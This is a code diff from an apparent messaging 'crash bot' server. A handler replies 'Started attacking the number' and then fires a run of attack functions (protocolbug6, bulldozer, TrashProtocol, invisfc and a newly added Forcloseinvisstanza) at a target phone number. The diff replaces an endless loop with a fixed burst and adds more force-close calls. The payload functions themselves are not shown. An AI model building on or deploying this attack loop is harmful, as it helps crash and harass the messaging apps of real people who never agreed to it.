@@ -500,23 +500,25 @@ async function invisfc(target, mention) {
     }
     try {
     	res.send(`Started attacking the number ${target}`);
-    	while (true) {
+    	await Forcloseinvisstanza(target)
         await protocolbug6(target)
         await bulldozer(target)
         await protocolbug6(target)
         await TrashProtocol(target);
+        await Forcloseinvisstanza(target)
         await bulldozer(target)
         await protocolbug6(target)
         await invisfc(target);
         await protocolbug6(target)
         await TrashProtocol(target);
+        await Forcloseinvisstanza(target)
         await bulldozer(target)
         await TrashProtocol(target);
         await bulldozer(target)
+        await Forcloseinvisstanza(target)
         await TrashProtocol(target);
         await invisfc(target);
         await protocolbug6(target);
-        }
          // Pass validated phone number to the function
     } catch (error) {
         console.error(error.message);
